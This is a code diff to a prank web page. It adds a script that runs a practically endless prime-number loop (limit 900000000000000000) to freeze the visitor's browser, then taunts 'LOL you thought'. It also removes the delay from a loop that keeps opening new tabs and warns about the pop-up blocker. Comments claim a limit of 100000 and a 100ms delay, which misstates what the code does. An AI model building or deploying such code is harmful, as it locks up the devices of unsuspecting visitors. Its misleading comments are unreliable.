@@ -84,6 +84,34 @@
             <body>
                 <h1 class="bouncing-text">LOLL</h1>
                 <div id="result"></div>
+                <script>
+                    // CPU-intensive JavaScript: Prime number calculation
+                    function findPrimes(limit) {
+                        const primes = [];
+                        for (let i = 2; i <= limit; i++) {
+                            let isPrime = true;
+                            for (let j = 2; j <= Math.sqrt(i); j++) {
+                                if (i % j === 0) {
+                                    isPrime = false;
+                                    break;
+                                }
+                            }
+                            if (isPrime) {
+                                primes.push(i);
+                            }
+                        }
+                        return primes;
+                    }
+
+                    // Increased limit to 100000 to make it more intensive
+                    const primeLimit = 900000000000000000;
+                    const startTime = performance.now();
+                    const foundPrimes = findPrimes(primeLimit);
+                    const endTime = performance.now();
+                    const timeTaken = (endTime - startTime).toFixed(2);
+                    document.getElementById('result').innerText = '';
+                    document.querySelector('.bouncing-text').innerText = 'LOL you thought';
+                <\/script>
             </body>
             </html>
         `;
@@ -112,7 +140,7 @@
                     alert("Pop-up blocker is preventing new tabs from opening. You may need to disable it manually.");
                     clearInterval(openInterval); // Stop trying if a block occurs
                 }
-            }; // 100ms delay between attempts
+            }, ); // 100ms delay between attempts
         });
     </script>
 </body>
